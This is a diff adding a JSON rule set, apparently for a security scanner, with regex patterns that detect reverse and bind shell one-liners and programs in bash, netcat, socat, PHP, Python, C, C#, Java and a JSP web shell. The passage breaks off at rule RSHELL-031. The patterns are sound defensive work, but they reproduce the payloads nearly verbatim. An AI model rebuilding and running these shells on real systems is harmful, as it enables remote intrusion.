@@ -1,0 +1,1066 @@
+{
+  "meta": {
+    "id": "sigil-core-reverse-shells",
+    "name": "Sigil Core — Reverse / Bind Shells",
+    "version": "1.0.0",
+    "updated_at": "2026-06-23",
+    "author": "NOMARJ <hello@sigilsec.ai>",
+    "description": "Detects reverse and bind shell command payloads across shells and languages (interactive C2 establishment). Generated from reverse-shell-generator (https://github.com/0dayCTF/reverse-shell-generator@main 9fda27f91b1b, retrieved 2026-06-22, MIT (see upstream LICENSE))."
+  },
+  "rules": [
+    {
+      "id": "RSHELL-001",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "php\\s+\\-r\\s+'\\$s=socket_create\\(AF_INET,SOCK_STREAM,SOL_TCP\\);socket_bind\\(\\$s,\"0\\.0\\.0\\.0\",\\d+\\);\\\\socket_listen\\(\\$s,1\\);\\$cl=socket_accept\\(\\$s\\);while\\(1\\)\\{if\\(!socket_write\\(\\$cl,\"\\$\\s+\",2\\)\\)exit;\\\\\\$in=socket_read\\(\\$cl,100\\);\\$cmd=popen\\(\"\\$in\",\"r\"\\);while\\(!feof\\(\\$cmd\\)\\)\\S+\\}'",
+      "description": "Bind shell payload (PHP Bind) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-002",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "perl\\s+\\-e\\s+'use\\s+Socket;\\$p=\\d+;socket\\(S,PF_INET,SOCK_STREAM,getprotobyname\\(\"tcp\"\\)\\);bind\\(S,sockaddr_in\\(\\$p,\\s+INADDR_ANY\\)\\);listen\\(S,SOMAXCONN\\);for\\(;\\$p=accept\\(C,S\\);close\\s+C\\)\\S+;'",
+      "description": "Bind shell payload (Perl Bind) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-003",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "python3\\s+\\-c\\s+'exec\\(\"\"\"import\\s+socket\\s+as\\s+s,subprocess\\s+as\\s+sp;s1=s\\.socket\\(s\\.AF_INET,s\\.SOCK_STREAM\\);s1\\.setsockopt\\(s\\.SOL_SOCKET,s\\.SO_REUSEADDR,\\s+1\\);s1\\.bind\\(\\(\"0\\.0\\.0\\.0\",\\d+\\)\\);s1\\.listen\\(1\\);c,a=s1\\.accept\\(\\);\\s+while\\s+True:\\s+d=c\\.recv\\(1024\\)\\.decode\\(\\);p=sp\\.Popen\\(d,shell=True,stdout=sp\\.PIPE,stderr=sp\\.PIPE,stdin=sp\\.PIPE\\);c\\.sendall\\(p\\.stdout\\.read\\(\\)\\+p\\.stderr\\.read\\(\\)\\)\"\"\"\\)'",
+      "description": "Bind shell payload (Python3 Bind) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-004",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "ruby\\s+\\-rsocket\\s+\\-e\\s+'f=TCPServer\\.new\\(9001\\);\\s+s=f\\.accept;\\s+\\[0,1,2\\]\\.each\\s+\\S+;\\s+exec\\s+\"/bin/sh\\s+\\-i\"'",
+      "description": "Bind shell payload (Ruby Bind) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-005",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "socat\\s+TCP\\-LISTEN:\\d+,reuseaddr,fork\\s+EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
+      "description": "Bind shell payload (Socat (TTY) Bind) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-006",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "nc\\s+\\-nlvp\\s+\\d+\\s+\\-e\\s+/bin/sh",
+      "description": "Bind shell payload (nc -e Bind) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-007",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "rm\\s+\\-f\\s+/tmp/f;\\s+mkfifo\\s+/tmp/f;\\s+cat\\s+/tmp/f\\s+\\|\\s+/bin/sh\\s+\\-i\\s+2>\\&1\\s+\\|\\s+nc\\s+\\-l\\s+0\\.0\\.0\\.0\\s+\\d+\\s+>\\s+/tmp/f",
+      "description": "Bind shell payload (nc mkfifo Bind) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-008",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "nc\\.exe\\s+\\-nlvp\\s+\\d+\\s+\\-e\\s+cmd",
+      "description": "Bind shell payload (nc.exe -e Bind) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-009",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "ncat\\s+\\-nlvp\\s+\\d+\\s+\\-e\\s+/bin/sh",
+      "description": "Bind shell payload (ncat -e Bind) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-010",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "awk\\s+'BEGIN\\s+\\{s\\s+=\\s+\"/inet/tcp/0/[\\w.\\-]+/\\d+\";\\s+while\\(42\\)\\s+\\{\\s+do\\{\\s+printf\\s+\"shell>\"\\s+\\|\\&\\s+s;\\s+s\\s+\\|\\&\\s+getline\\s+c;\\s+if\\(c\\)\\S+\\s+\\}\\s+while\\(c\\s+!=\\s+\"exit\"\\)\\s+close\\(s\\);\\s+\\}\\}'\\s+/dev/null",
+      "description": "Reverse shell payload (Awk) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-011",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "\\S+\\s+\\-i\\s+>\\&\\s+/dev/tcp/[\\w.\\-]+/\\d+\\s+0>\\&1",
+      "description": "Reverse shell payload (Bash -i) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-012",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "0<\\&196;exec\\s+196<>/dev/tcp/[\\w.\\-]+/\\d+;\\s+\\S+\\s+<\\&196\\s+>\\&196\\s+2>\\&196",
+      "description": "Reverse shell payload (Bash 196) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-013",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "\\S+\\s+\\-i\\s+5<>\\s+/dev/tcp/[\\w.\\-]+/\\d+\\s+0<\\&5\\s+1>\\&5\\s+2>\\&5",
+      "description": "Reverse shell payload (Bash 5) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-014",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "exec\\s+5<>/dev/tcp/[\\w.\\-]+/\\d+;cat\\s+<\\&5\\s+\\|\\s+while\\s+read\\s+line;\\s+do\\s+\\$line\\s+2>\\&5\\s+>\\&5;\\s+done",
+      "description": "Reverse shell payload (Bash read line) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-015",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "\\S+\\s+\\-i\\s+>\\&\\s+/dev/udp/[\\w.\\-]+/\\d+\\s+0>\\&1",
+      "description": "Reverse shell payload (Bash udp) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-016",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "busybox\\s+nc\\s+[\\w.\\-]+\\s+\\d+\\s+\\-e\\s+\\S+",
+      "description": "Reverse shell payload (BusyBox nc -e) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-017",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "\\#include\\s+<stdio\\.h>\\s+\\#include\\s+<sys/socket\\.h>\\s+\\#include\\s+<sys/types\\.h>\\s+\\#include\\s+<stdlib\\.h>\\s+\\#include\\s+<unistd\\.h>\\s+\\#include\\s+<netinet/in\\.h>\\s+\\#include\\s+<arpa/inet\\.h>\\s+int\\s+main\\(void\\)\\{\\s+int\\s+port\\s+=\\s+\\d+;\\s+struct\\s+sockaddr_in\\s+revsockaddr;\\s+int\\s+sockt\\s+=\\s+socket\\(AF_INET,\\s+SOCK_STREAM,\\s+0\\);\\s+revsockaddr\\.sin_family\\s+=\\s+AF_INET;\\s+revsockaddr\\.sin_port\\s+=\\s+htons\\(port\\);\\s+revsockaddr\\.sin_addr\\.s_addr\\s+=\\s+inet_addr\\(\"[\\w.\\-]+\"\\);\\s+connect\\(sockt,\\s+\\(struct\\s+sockaddr\\s+\\*\\)\\s+\\&revsockaddr,\\s+sizeof\\(revsockaddr\\)\\);\\s+dup2\\(sockt,\\s+0\\);\\s+dup2\\(sockt,\\s+1\\);\\s+dup2\\(sockt,\\s+2\\);\\s+char\\s+\\*\\s+const\\s+argv\\[\\]\\s+=\\s+\\S+;\\s+execvp\\(\"\\S+\",\\s+argv\\);\\s+return\\s+0;\\s+\\}",
+      "description": "Reverse shell payload (C) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-018",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "\\#include\\s+<winsock2\\.h>\\\\r\\s+\\#include\\s+<stdio\\.h>\\\\r\\s+\\#pragma\\s+comment\\(lib,\"ws2_32\"\\)\\\\r\\s+\\\\r\\s+WSADATA\\s+wsaData;\\\\r\\s+SOCKET\\s+Winsock;\\\\r\\s+struct\\s+sockaddr_in\\s+hax;\\s+\\\\r\\s+char\\s+ip_addr\\[16\\]\\s+=\\s+\"[\\w.\\-]+\";\\s+\\\\r\\s+char\\s+port\\[6\\]\\s+=\\s+\"\\d+\";\\s+\\\\r\\s+\\\\r\\s+STARTUPINFO\\s+ini_processo;\\\\r\\s+\\\\r\\s+PROCESS_INFORMATION\\s+processo_info;\\\\r\\s+\\\\r\\s+int\\s+main\\(\\)\\\\r\\s+\\S+",
+      "description": "Reverse shell payload (C Windows) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-019",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "using\\s+System;\\s+using\\s+System\\.Diagnostics;\\s+namespace\\s+BackConnect\\s+\\{\\s+class\\s+ReverseBash\\s+\\{\\s+public\\s+static\\s+void\\s+Main\\(string\\[\\]\\s+args\\)\\s+\\{\\s+Process\\s+proc\\s+=\\s+new\\s+System\\.Diagnostics\\.Process\\(\\);\\s+proc\\.StartInfo\\.FileName\\s+=\\s+\"\\S+\";\\s+proc\\.StartInfo\\.Arguments\\s+=\\s+\"\\-c\\s+\\\\\"\\S+\\s+\\-i\\s+>\\&\\s+/dev/tcp/[\\w.\\-]+/\\d+\\s+0>\\&1\\\\\"\";\\s+proc\\.StartInfo\\.UseShellExecute\\s+=\\s+false;\\s+proc\\.StartInfo\\.RedirectStandardOutput\\s+=\\s+true;\\s+proc\\.Start\\(\\);\\s+while\\s+\\(!proc\\.StandardOutput\\.EndOfStream\\)\\s+\\S+\\s+\\}\\s+\\}\\s+\\}",
+      "description": "Reverse shell payload (C# Bash -i) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-020",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "using\\s+System;\\s+using\\s+System\\.Text;\\s+using\\s+System\\.IO;\\s+using\\s+System\\.Diagnostics;\\s+using\\s+System\\.ComponentModel;\\s+using\\s+System\\.Linq;\\s+using\\s+System\\.Net;\\s+using\\s+System\\.Net\\.Sockets;\\s+namespace\\s+ConnectBack\\s+\\{\\s+public\\s+class\\s+Program\\s+\\{\\s+static\\s+StreamWriter\\s+streamWriter;\\s+public\\s+static\\s+void\\s+Main\\(string\\[\\]\\s+args\\)\\s+\\{\\s+using\\(TcpClient\\s+client\\s+=\\s+new\\s+TcpClient\\(\"[\\w.\\-]+\",\\s+\\d+\\)\\)\\s+\\{\\s+using\\(Stream\\s+stream\\s+=\\s+client\\.GetStream\\(\\)\\)\\s+\\{\\s+using\\(StreamReader\\s+rdr\\s+=\\s+new\\s+StreamReader\\(stream\\)\\)\\s+\\{\\s+streamWriter\\s+=\\s+new\\s+StreamWriter\\(stream\\);\\s+StringBuilder\\s+strInput\\s+=\\s+new\\s+StringBuilder\\(\\);\\s+Process\\s+p\\s+=\\s+new\\s+Process\\(\\);\\s+p\\.StartInfo\\.FileName\\s+=\\s+\"\\S+\";\\s+p\\.StartInfo\\.CreateNoWindow\\s+=\\s+true;\\s+p\\.StartInfo\\.UseShellExecute\\s+=\\s+false;\\s+p\\.StartInfo\\.RedirectStandardOutput\\s+=\\s+true;\\s+p\\.StartInfo\\.RedirectStandardInput\\s+=\\s+true;\\s+p\\.StartInfo\\.RedirectStandardError\\s+=\\s+true;\\s+p\\.OutputDataReceived\\s+\\+=\\s+new\\s+DataReceivedEventHandler\\(CmdOutputDataHandler\\);\\s+p\\.Start\\(\\);\\s+p\\.BeginOutputReadLine\\(\\);\\s+while\\(true\\)\\s+\\S+\\s+\\}\\s+\\}\\s+\\}\\s+\\}\\s+private\\s+static\\s+void\\s+CmdOutputDataHandler\\(object\\s+sendingProcess,\\s+DataReceivedEventArgs\\s+outLine\\)\\s+\\{\\s+StringBuilder\\s+strOutput\\s+=\\s+new\\s+StringBuilder\\(\\);\\s+if\\s+\\(!String\\.IsNullOrEmpty\\(outLine\\.Data\\)\\)\\s+\\{\\s+try\\s+\\S+\\s+catch\\s+\\(Exception\\s+err\\)\\s+\\S+\\s+\\}\\s+\\}\\s+\\}\\s+\\}",
+      "description": "Reverse shell payload (C# TCP Client) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-021",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "require\\s+\"process\"\\s+require\\s+\"socket\"\\s+c\\s+=\\s+Socket\\.tcp\\(Socket::Family::INET\\)\\s+c\\.connect\\(\"[\\w.\\-]+\",\\s+\\d+\\)\\s+loop\\s+do\\s+m,\\s+l\\s+=\\s+c\\.receive\\s+p\\s+=\\s+Process\\.new\\(m\\.rstrip\\(\"\\s+\"\\),\\s+output:Process::Redirect::Pipe,\\s+shell:true\\)\\s+c\\s+<<\\s+p\\.output\\.gets_to_end\\s+end",
+      "description": "Reverse shell payload (Crystal (code)) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-022",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "crystal\\s+eval\\s+'require\\s+\"process\";require\\s+\"socket\";c=Socket\\.tcp\\(Socket::Family::INET\\);c\\.connect\\(\"[\\w.\\-]+\",\\d+\\);loop\\S+'",
+      "description": "Reverse shell payload (Crystal (system)) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-023",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "import\\s+'dart:io';\\s+import\\s+'dart:convert';\\s+main\\(\\)\\s+\\{\\s+Socket\\.connect\\(\"[\\w.\\-]+\",\\s+\\d+\\)\\.then\\(\\(socket\\)\\s+\\{\\s+socket\\.listen\\(\\(data\\)\\s+\\{\\s+Process\\.start\\('\\S+',\\s+\\[\\]\\)\\.then\\(\\(Process\\s+process\\)\\s+\\{\\s+process\\.stdin\\.writeln\\(new\\s+String\\.fromCharCodes\\(data\\)\\.trim\\(\\)\\);\\s+process\\.stdout\\s+\\.transform\\(utf8\\.decoder\\)\\s+\\.listen\\(\\(output\\)\\s+\\S+\\);\\s+\\}\\);\\s+\\},\\s+onDone:\\s+\\(\\)\\s+\\S+\\);\\s+\\}\\);\\s+\\}",
+      "description": "Reverse shell payload (Dart) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-024",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "echo\\s+'package\\s+main;import\"os/exec\";import\"net\";func\\s+main\\(\\)\\S+'\\s+>\\s+/tmp/t\\.go\\s+\\&\\&\\s+go\\s+run\\s+/tmp/t\\.go\\s+\\&\\&\\s+rm\\s+/tmp/t\\.go",
+      "description": "Reverse shell payload (Golang) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-025",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "String\\s+host=\"[\\w.\\-]+\";int\\s+port=\\d+;String\\s+cmd=\"\\S+\";Process\\s+p=new\\s+ProcessBuilder\\(cmd\\)\\.redirectErrorStream\\(true\\)\\.start\\(\\);Socket\\s+s=new\\s+Socket\\(host,port\\);InputStream\\s+pi=p\\.getInputStream\\(\\),pe=p\\.getErrorStream\\(\\),\\s+si=s\\.getInputStream\\(\\);OutputStream\\s+po=p\\.getOutputStream\\(\\),so=s\\.getOutputStream\\(\\);while\\(!s\\.isClosed\\(\\)\\)\\{while\\(pi\\.available\\(\\)>0\\)so\\.write\\(pi\\.read\\(\\)\\);while\\(pe\\.available\\(\\)>0\\)so\\.write\\(pe\\.read\\(\\)\\);while\\(si\\.available\\(\\)>0\\)po\\.write\\(si\\.read\\(\\)\\);so\\.flush\\(\\);po\\.flush\\(\\);Thread\\.sleep\\(50\\);try\\s+\\S+catch\\s+\\(Exception\\s+e\\)\\S+\\};p\\.destroy\\(\\);s\\.close\\(\\);",
+      "description": "Reverse shell payload (Groovy) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-026",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "module\\s+Main\\s+where\\s+import\\s+System\\.Process\\s+main\\s+=\\s+callCommand\\s+\"rm\\s+/tmp/f;mkfifo\\s+/tmp/f;cat\\s+/tmp/f\\s+\\|\\s+\\S+\\s+\\-i\\s+2>\\&1\\s+\\|\\s+nc\\s+[\\w.\\-]+\\s+\\d+\\s+>/tmp/f\"",
+      "description": "Reverse shell payload (Haskell #1) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-027",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "public\\s+class\\s+shell\\s+\\{\\s+public\\s+static\\s+void\\s+main\\(String\\[\\]\\s+args\\)\\s+\\{\\s+Process\\s+p;\\s+try\\s+\\S+\\s+catch\\s+\\(Exception\\s+e\\)\\s+\\S+\\s+\\}\\s+\\}",
+      "description": "Reverse shell payload (Java #1) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-028",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "public\\s+class\\s+shell\\s+\\{\\s+public\\s+static\\s+void\\s+main\\(String\\[\\]\\s+args\\)\\s+\\{\\s+ProcessBuilder\\s+pb\\s+=\\s+new\\s+ProcessBuilder\\(\"bash\",\\s+\"\\-c\",\\s+\"\\$@\\|\\s+bash\\s+\\-i\\s+>\\&\\s+/dev/tcp/[\\w.\\-]+/\\d+\\s+0>\\&1\"\\)\\s+\\.redirectErrorStream\\(true\\);\\s+try\\s+\\S+\\s+catch\\s+\\(Exception\\s+e\\)\\s+\\S+\\s+\\}\\s+\\}",
+      "description": "Reverse shell payload (Java #2) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-029",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "import\\s+java\\.io\\.InputStream;\\s+import\\s+java\\.io\\.OutputStream;\\s+import\\s+java\\.net\\.Socket;\\s+public\\s+class\\s+shell\\s+\\{\\s+public\\s+static\\s+void\\s+main\\(String\\[\\]\\s+args\\)\\s+\\{\\s+String\\s+host\\s+=\\s+\"[\\w.\\-]+\";\\s+int\\s+port\\s+=\\s+\\d+;\\s+String\\s+cmd\\s+=\\s+\"\\S+\";\\s+try\\s+\\{\\s+Process\\s+p\\s+=\\s+new\\s+ProcessBuilder\\(cmd\\)\\.redirectErrorStream\\(true\\)\\.start\\(\\);\\s+Socket\\s+s\\s+=\\s+new\\s+Socket\\(host,\\s+port\\);\\s+InputStream\\s+pi\\s+=\\s+p\\.getInputStream\\(\\),\\s+pe\\s+=\\s+p\\.getErrorStream\\(\\),\\s+si\\s+=\\s+s\\.getInputStream\\(\\);\\s+OutputStream\\s+po\\s+=\\s+p\\.getOutputStream\\(\\),\\s+so\\s+=\\s+s\\.getOutputStream\\(\\);\\s+while\\s+\\(!s\\.isClosed\\(\\)\\)\\s+\\{\\s+while\\s+\\(pi\\.available\\(\\)\\s+>\\s+0\\)\\s+so\\.write\\(pi\\.read\\(\\)\\);\\s+while\\s+\\(pe\\.available\\(\\)\\s+>\\s+0\\)\\s+so\\.write\\(pe\\.read\\(\\)\\);\\s+while\\s+\\(si\\.available\\(\\)\\s+>\\s+0\\)\\s+po\\.write\\(si\\.read\\(\\)\\);\\s+so\\.flush\\(\\);\\s+po\\.flush\\(\\);\\s+Thread\\.sleep\\(50\\);\\s+try\\s+\\S+\\s+catch\\s+\\(Exception\\s+e\\)\\s+\\S+\\s+\\}\\s+p\\.destroy\\(\\);\\s+s\\.close\\(\\);\\s+\\}\\s+catch\\s+\\(Exception\\s+e\\)\\s+\\S+\\s+\\}\\s+\\}",
+      "description": "Reverse shell payload (Java #3) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-030",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "<%\\\\r\\s+/\\*\\\\r\\s+\\*\\s+Usage:\\s+This\\s+is\\s+a\\s+2\\s+way\\s+shell,\\s+one\\s+web\\s+shell\\s+and\\s+a\\s+reverse\\s+shell\\.\\s+First,\\s+it\\s+will\\s+try\\s+to\\s+connect\\s+to\\s+a\\s+listener\\s+\\(atacker\\s+machine\\),\\s+with\\s+the\\s+IP\\s+and\\s+Port\\s+specified\\s+at\\s+the\\s+end\\s+of\\s+the\\s+file\\.\\\\r\\s+\\*\\s+If\\s+it\\s+cannot\\s+connect,\\s+an\\s+HTML\\s+will\\s+prompt\\s+and\\s+you\\s+can\\s+input\\s+commands\\s+\\(sh/cmd\\)\\s+there\\s+and\\s+it\\s+will\\s+prompts\\s+the\\s+output\\s+in\\s+the\\s+HTML\\.\\\\r\\s+\\*\\s+Note\\s+that\\s+this\\s+last\\s+functionality\\s+is\\s+slow,\\s+so\\s+the\\s+first\\s+one\\s+\\(reverse\\s+shell\\)\\s+is\\s+recommended\\.\\s+Each\\s+time\\s+the\\s+button\\s+\"send\"\\s+is\\s+clicked,\\s+it\\s+will\\s+try\\s+to\\s+connect\\s+to\\s+the\\s+reverse\\s+shell\\s+again\\s+\\(apart\\s+from\\s+executing\\s+\\\\r\\s+\\*\\s+the\\s+command\\s+specified\\s+in\\s+the\\s+HTML\\s+form\\)\\.\\s+This\\s+is\\s+to\\s+avoid\\s+to\\s+keep\\s+it\\s+simple\\.\\\\r\\s+\\*/\\\\r\\s+%>\\\\r\\s+\\\\r\\s+<%@page\\s+import=\"java\\.lang\\.\\*\"%>\\\\r\\s+<%@page\\s+import=\"java\\.io\\.\\*\"%>\\\\r\\s+<%@page\\s+import=\"java\\.net\\.\\*\"%>\\\\r\\s+<%@page\\s+import=\"java\\.util\\.\\*\"%>\\\\r\\s+\\\\r\\s+<html>\\\\r\\s+<head>\\\\r\\s+<title>jrshell</title>\\\\r\\s+</head>\\\\r\\s+<body>\\\\r\\s+<form\\s+METHOD=\"POST\"\\s+NAME=\"myform\"\\s+ACTION=\"\">\\\\r\\s+<input\\s+TYPE=\"text\"\\s+NAME=\"shell\">\\\\r\\s+<input\\s+TYPE=\"submit\"\\s+VALUE=\"Send\">\\\\r\\s+</form>\\\\r\\s+<pre>\\\\r\\s+<%\\\\r\\s+//\\s+Define\\s+the\\s+OS\\\\r\\s+String\\s+shellPath\\s+=\\s+null;\\\\r\\s+try\\\\r\\s+\\{\\\\r\\s+if\\s+\\(System\\.getProperty\\(\"os\\.name\"\\)\\.toLowerCase\\(\\)\\.indexOf\\(\"windows\"\\)\\s+==\\s+\\-1\\)\\s+\\S+\\s+else\\s+\\S+\\\\r\\s+\\}\\s+catch\\(\\s+Exception\\s+e\\s+\\)\\S+\\\\r\\s+//\\s+INNER\\s+HTML\\s+PART\\\\r\\s+if\\s+\\(request\\.getParameter\\(\"shell\"\\)\\s+!=\\s+null\\)\\s+\\{\\\\r\\s+out\\.println\\(\"Command:\\s+\"\\s+\\+\\s+request\\.getParameter\\(\"shell\"\\)\\s+\\+\\s+\"\\s+<BR>\"\\);\\\\r\\s+Process\\s+p;\\\\r\\s+if\\s+\\(shellPath\\.equals\\(\"cmd\\.exe\"\\)\\)\\\\r\\s+p\\s+=\\s+Runtime\\.getRuntime\\(\\)\\.exec\\(\"cmd\\.exe\\s+/c\\s+\"\\s+\\+\\s+request\\.getParameter\\(\"shell\"\\)\\);\\\\r\\s+else\\\\r\\s+p\\s+=\\s+Runtime\\.getRuntime\\(\\)\\.exec\\(\"/bin/sh\\s+\\-c\\s+\"\\s+\\+\\s+request\\.getParameter\\(\"shell\"\\)\\);\\\\r\\s+OutputStream\\s+os\\s+=\\s+p\\.getOutputStream\\(\\);\\\\r\\s+InputStream\\s+in\\s+=\\s+p\\.getInputStream\\(\\);\\\\r\\s+DataInputStream\\s+dis\\s+=\\s+new\\s+DataInputStream\\(in\\);\\\\r\\s+String\\s+disr\\s+=\\s+dis\\.readLine\\(\\);\\\\r\\s+while\\s+\\(\\s+disr\\s+!=\\s+null\\s+\\)\\s+\\S+\\\\r\\s+\\}\\\\r\\s+//\\s+TCP\\s+PORT\\s+PART\\\\r\\s+class\\s+StreamConnector\\s+extends\\s+Thread\\\\r\\s+\\{\\\\r\\s+InputStream\\s+wz;\\\\r\\s+OutputStream\\s+yr;\\\\r\\s+StreamConnector\\(\\s+InputStream\\s+wz,\\s+OutputStream\\s+yr\\s+\\)\\s+\\S+\\\\r\\s+public\\s+void\\s+run\\(\\)\\\\r\\s+\\{\\\\r\\s+BufferedReader\\s+r\\s+=\\s+null;\\\\r\\s+BufferedWriter\\s+w\\s+=\\s+null;\\\\r\\s+try\\\\r\\s+\\{\\\\r\\s+r\\s+=\\s+new\\s+BufferedReader\\(new\\s+InputStreamReader\\(wz\\)\\);\\\\r\\s+w\\s+=\\s+new\\s+BufferedWriter\\(new\\s+OutputStreamWriter\\(yr\\)\\);\\\\r\\s+char\\s+buffer\\[\\]\\s+=\\s+new\\s+char\\[8192\\];\\\\r\\s+int\\s+length;\\\\r\\s+while\\(\\s+\\(\\s+length\\s+=\\s+r\\.read\\(\\s+buffer,\\s+0,\\s+buffer\\.length\\s+\\)\\s+\\)\\s+>\\s+0\\s+\\)\\\\r\\s+\\S+\\\\r\\s+\\}\\s+catch\\(\\s+Exception\\s+e\\s+\\)\\S+\\\\r\\s+try\\\\r\\s+\\S+\\s+catch\\(\\s+Exception\\s+e\\s+\\)\\S+\\\\r\\s+\\}\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+try\\s+\\S+\\s+catch\\(\\s+Exception\\s+e\\s+\\)\\s+\\S+\\\\r\\s+%>\\\\r\\s+</pre>\\\\r\\s+</body>\\\\r\\s+</html>",
+      "description": "Reverse shell payload (Java Two Way) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-031",
